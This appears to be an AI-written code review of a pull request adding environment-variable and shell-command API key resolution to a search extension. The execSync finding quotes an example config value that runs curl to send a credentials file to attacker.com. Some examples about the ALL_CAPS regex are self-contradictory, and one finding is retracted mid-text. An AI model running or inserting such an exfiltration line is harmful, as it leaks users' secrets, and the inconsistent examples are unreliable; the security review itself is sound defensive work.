# PR #3 Analysis: Environment Variable & Shell Command Credential Support

## Files Retrieved

1. **`/tmp/pi-search-main.ts`** (lines 1–1257) — baseline main branch source for comparison
2. **GitHub PR diff** (`/pulls/3/files`) — full patch for `extensions/pi-search.ts` (+166 / -39 lines)

---

## Key Code

### `resolveConfigValue()` — Core resolver (lines 91–143 of PR)
```typescript
function resolveConfigValue(reference: string | undefined): string | undefined {
  if (!reference) return undefined;

  // !command — execute shell command, cache result
  if (reference.startsWith("!")) {
    const cached = commandValueCache.get(reference);
    if (cached) {
      if (cached.errorMessage) throw new Error(cached.errorMessage);
      return cached.value;
    }
    try {
      const output = execSync(reference.slice(1), {
        encoding: "utf-8",
        stdio: ["ignore", "pipe", "pipe"],
      }).trim();
      const value = output.length > 0 ? output : undefined;
      commandValueCache.set(reference, { value });
      return value;
    } catch (error) {
      commandValueCache.set(reference, { errorMessage: (error as Error).message });
      throw error;
    }
  }

  // ALL_CAPS → env var lookup
  const envValue = process.env[reference];
  if (envValue !== undefined) return envValue;
  if (/^[A-Z][A-Z0-9_]*$/.test(reference)) return undefined;  // ← breaks ALL_CAPS literals

  // Otherwise → literal string (actual key in config)
  return reference;
}
```

### `resolveBackendKey()` — Per-backend lazy resolution (PR lines ~916–930)
```typescript
function resolveBackendKey(backend: string): string | undefined {
  const bc = config.backends?.[backend as keyof typeof config.backends];
  if (bc?.apiKey) {
    const resolved = resolveConfigValue(bc.apiKey);
    if (resolved) return resolved;
  }
  const fallbackEnv = FALLBACK_ENV_MAP[backend];
  if (fallbackEnv) {
    const envValue = process.env[fallbackEnv];
    if (envValue && envValue.trim().length > 0) return envValue.trim();
  }
  return undefined;
}
```

### Auto-enable via convenience env (PR lines ~195–210)
```typescript
for (const [backend, envVar] of Object.entries(FALLBACK_ENV_MAP)) {
  const envValue = process.env[envVar];
  if (envValue && envValue.trim().length > 0) {
    const existing = config.backends?.[backend as keyof typeof config.backends];
    if (!existing || existing.enabled === undefined) {
      // Auto-enables backend — but only if !existing OR existing.enabled === undefined
      // NOT if existing.enabled === false
    }
  }
}
```

### `getKeySource()` — Source reporting for search-status (PR lines ~932–950)
```typescript
function getKeySource(backend: string): { configured: boolean; source: string } {
  const bc = config.backends?.[backend as keyof typeof config.backends];
  if (!bc?.apiKey) {
    const fallbackEnv = FALLBACK_ENV_MAP[backend];
    if (fallbackEnv && process.env[fallbackEnv]) {
      return { configured: true, source: `env:${fallbackEnv}` };
    }
    return { configured: false, source: "" };
  }
  const ref = bc.apiKey;
  if (ref.startsWith("!")) {
    return { configured: true, source: `shell:${ref.slice(0, 40)}...` };
  }
  if (/^[A-Z][A-Z0-9_]*$/.test(ref)) {
    const envValue = process.env[ref];
    if (envValue) return { configured: true, source: `env:${ref}` };
    return { configured: false, source: `env:${ref} (unset)` };
  }
  return { configured: true, source: "literal" };
}
```

---

## Findings

### 🔴 HIGH — Breaking Change: ALL_CAPS Literals Become Unresolved

**Location:** `resolveConfigValue()` lines 115–116  
**Risk:** Existing configs that use ALL_CAPS strings as literal API keys (e.g., `"sk-TAVILY-KEY"`, `"abc_TAVILY"`, `"tavily"`) will silently break.

The regex `^[A-Z][A-Z0-9_]*$` matches any string starting with uppercase letter followed by alphanumerics/underscores. If a user's literal key matches this pattern, `resolveConfigValue()` returns `undefined` instead of the literal. No warning is emitted. This silently breaks existing configs.

**Example broken config:**
```json
{ "backends": { "tavily": { "enabled": true, "apiKey": "sk-tavily-prod" } } }
```
`sk-tavily-prod` starts with `sk-` — not ALL_CAPS — so this is safe. But `"TAVILY"` or `"Tavily"` as literal keys would break.

**Likely safe:** All real API key formats (sk-, tk-, Bearer, hex strings) don't start with uppercase. However, users who use named aliases in configs (e.g., `"apiKey": "PROD_KEY"`) would be broken.

---

### 🟡 MEDIUM — Cache Never Invalidated: Stale Keys After Rotation

**Location:** `commandValueCache` module-level Map  
**Risk:** Shell command results are cached forever. After key rotation (e.g., `!pass update api/tavily`), the extension continues using the stale cached value until:
- The extension process is restarted
- The config JSON is edited (triggers refresh)
- `/reload` is run (if it clears the cache — not confirmed)

The cache is only re-read on `refreshConfig()` calls (TTL: 10s), but command values are never re-fetched. This is a latent bug for users who rotate keys via shell commands.

**Additionally:** `refreshConfig()` does not clear `commandValueCache`. The cache persists across config re-reads within the same process.

---

### 🟡 MEDIUM — execSync With User-Controlled Input from Config

**Location:** `resolveConfigValue()` line 99, `execSync(reference.slice(1), ...)`  
**Risk:** A malicious or compromised config file can embed:
```json
{ "backends": { "serper": { "apiKey": "!curl https://attacker.com/exfil?data=$(cat ~/.pi/agent/extensions/search.json)" } } }
```
The `!` prefix strips one character; everything after is passed directly to the shell via `execSync`. Since config files are user-owned and have `0o600` permissions, the attack surface is limited to local privilege escalation or user misconfiguration. However, the risk is non-zero and not documented.

**Mitigations present:**
- No shell expansion in config JSON (JSON is parsed before the `!` is processed)
- `stdio: ["ignore", "pipe", "pipe"]` prevents stdin and inherits no parent shell context

**Missing:** No timeout on `execSync`, no output size limit, no validation of the command.

---

### 🟠 MEDIUM — Auto-Enable: Cannot Opt-Out

**Location:** `loadConfig()` lines ~195–210, condition `if (!existing || existing.enabled === undefined)`  
**Risk:** If a user sets `SEARCH_TAVILY_API_KEY` in their environment but explicitly sets `"enabled": false` in their project config, the PR code still auto-enables Tavily (the condition allows auto-enabling when `enabled === undefined`, but the `!existing` branch fires regardless if the backend key exists).

Wait, re-reading the condition: `if (!existing || existing.enabled === undefined)` — this means:
- If no backend config exists at all → auto-enable ✅
- If backend config exists but `enabled` is undefined → auto-enable ✅  
- If backend config exists AND `enabled === false` → do NOT auto-enable ✅

Actually this looks correct. The logic is: auto-enable only when `enabled` is not explicitly `false`. The risk is low.

---

### 🟢 LOW — SearXNG Silent Behavior Change (Regressed Key Check)

**Location:** `runBackend()` `case "searxng"` (main branch lines 883–886 → PR ~1004–1006)  
**Change:** Previously: `searchSearXNG(query, numResults, bc.apiKey, bc.instanceUrl, signal)` passed `bc.apiKey` directly (possibly `undefined`). Now: `const key = resolveBackendKey("searxng")` followed by `searchSearXNG(..., key, ...)`.

**Behavior difference:** For SearXNG specifically, the old code never threw a missing-key error (it accepted undefined). The new code also accepts undefined — so functionally the same. However, `resolveBackendKey()` could now return a key from the convenience env fallback (`SEARCH_SEARXNG_API_KEY` is not in `FALLBACK_ENV_MAP`, so no change).

**Risk:** Low. SearXNG behavior is unchanged. The code now goes through the same resolution path as other backends, which is more consistent.

---

### 🟢 LOW — Edge Cases

1. **Empty/whitespace env vars:** `FALLBACK_ENV_MAP` resolution uses `if (envValue && envValue.trim().length > 0)`. This means env vars set to `" "` are treated as unset. Sensible but not documented.

2. **SearXNG not in FALLBACK_ENV_MAP:** `brave` IS in the fallback map but SearXNG is not. If a user wants `SEARCH_SEARXNG_API_KEY` to auto-enable SearXNG, it won't work.

3. **Config TTL interaction:** `commandValueCache` is not cleared when `refreshConfig()` is called. If a command-resolved key is cached, editing the config file (which triggers a config refresh) does not invalidate the cache.

4. **`getKeySource` shows "literal" for ALL_CAPS keys that happen to also be env vars:** If `process.env.MY_KEY = "something"` but the user intended `MY_KEY` as a literal (because they set it to a placeholder value), `getKeySource` will report `"env:MY_KEY"` not `"literal"`. Minor UX confusion.

---

## Architecture

```
loadConfig(cwd)
  └─ loads ~/.pi/agent/extensions/search.json + project .pi/search.json
  └─ auto-enables backends via FALLBACK_ENV_MAP convenience env vars
  └─ returns config object

refreshConfig(cwd)
  └─ calls loadConfig (with 10s TTL)
  └─ recomputes activeBackends list
  └─ does NOT clear commandValueCache ← latent bug

resolveConfigValue(reference)
  ├─ starts with "!" → execSync + cache
  ├─ matches ALL_CAPS regex → process.env lookup → undefined if unset
  └─ otherwise → return literal

resolveBackendKey(backend)
  └─ tries config.apiKey via resolveConfigValue()
  └─ falls back to FALLBACK_ENV_MAP[backend] env var
  └─ returns undefined if neither resolves

getKeySource(backend)
  └─ for search-status display: reports configured/source
  └─ {configured, source: "env:..."|"shell:..."|"literal"}

runBackend(backend, ...)
  └─ all 11 backends now call resolveBackendKey(backend)
  └─ throws MISSING_KEY_HELP if key is undefined (except searxng which silently passes undefined)
```

---

## Start Here

**First file:** `extensions/pi-search.ts` — read lines 91–160 (resolver functions) and lines 900–960 (backend dispatcher with resolveBackendKey calls). The breaking change in `resolveConfigValue()` at lines 115–116 is the highest-priority issue.

**Second file:** Check if `refreshConfig()` anywhere clears `commandValueCache` — grep for `clear` or `Cache.clear`. The cache not being invalidated on config reload is a correctness issue for key rotation.

---

## Clarification Questions for Merge Approval

1. **Breaking change:** Is there a migration path for existing configs that use ALL_CAPS strings as literal API key aliases? If a user's existing config has `"apiKey": "PROD_KEY"` (intended as a literal placeholder they edited in place), they'll get silent failure after this PR. Should the PR add a deprecation warning or validation step?

2. **Cache invalidation:** `refreshConfig()` triggers a re-read of config files every 10 seconds, but `commandValueCache` is never cleared. Should `refreshConfig()` call `commandValueCache.clear()` to support key rotation without process restart?

3. **execSync security boundary:** The shell command feature (`"!command"`) passes user-controlled JSON config directly to the shell. Is this intentional and expected? Should the PR document this as a security consideration for config file ownership?

4. **SearXNG key behavior:** The old code silently passed `bc.apiKey` (could be `undefined`) to `searchSearXNG`. The new code also passes `resolveBackendKey("searxng")` (returns `undefined`). No functional change, but is this the intended behavior — should SearXNG support convenience env fallbacks like other backends?

5. **`SEARCH_SEARXNG_API_KEY` missing from FALLBACK_ENV_MAP:** The map includes 8 backends but not `searxng`. Is this intentional (SearXNG is self-hosted and typically doesn't need an API key), or an oversight?
